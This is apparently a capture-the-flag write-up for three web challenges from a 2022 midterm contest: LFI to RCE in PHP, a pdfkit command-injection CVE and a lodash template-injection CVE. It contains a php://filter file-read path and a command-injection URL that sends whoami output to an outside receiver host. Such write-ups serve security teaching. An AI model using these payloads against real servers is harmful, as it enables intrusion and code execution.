# scist-2022-midterm

## Web

### Box

> Hint: `http://{HOST}//var/www/html/get.php`
>
> Vulnerabilities: Info Leak + LFI to RCE 

Access the `/Dockerfile` hint tab, and we can find that the Apache rewrite module is enabled, and some lines are commented out, which makes `/.htaccess`  readable.

We can see that every path is rewritten to `index.php`, and a hint on CTFd shows that we can arbitrarily include any file.

Using the PHP wrapper, we can read the source code.
`/php://filter/convert.base64-encode/resource=/var/www/html/index.php` 

To achieve RCE and get the flag, we can use one of the following methods:

- session.upload_progress
  https://blog.orange.tw/2018/10/
- PHP_INCLUDE_TO_SHELL_CHAR_DICT
  https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
- pearcmd.php
  https://github.com/w181496/Web-CTF-Cheatsheet#pear


### PDF Generator

> Hint: `http://{HOST}/Gemfile`
> 
> Vulnerabilities: command injection CVE

The source code reveals that this is a Ruby application.
By accessing `/Gemfile`, we can view the package version.

We can see that the application is using `pdfkit`  with a version that is vulnerable to a command injection CVE.
`gem 'pdfkit', '< 0.8.7.2'`

To exploit this vulnerability, we can use the following technique described in [pdfkit/pdfkit#517](https://github.com/pdfkit/pdfkit/issues/517):

Use a URL that contains a command injection payload, for example: `http://{HOST}/pdf?url=http://{RECEIVER}/$(whoami)`.

By injecting a command into the `url` parameter and passing it to the `pdf` endpoint, we can execute arbitrary commands on the server and obtain the flag.

### Template

> Vulnerabilities: options injection CVE

The source code reveals that this is a Node.js application. By accessing `/leak/package.json` and `/leak/package-lock.json`, we can retrieve the package information.

By running the `npm audit` command, we can identify any vulnerabilities in the packages used by the application. In this case, we have found a high-severity vulnerability in `lodash` with a CVE for options injection.
https://github.com/advisories/GHSA-35jh-r3h4-6jhm

By exploiting this vulnerability, an attacker could inject malicious options to the `_.template` method of the `lodash` package and execute arbitrary Node.js code on the server.

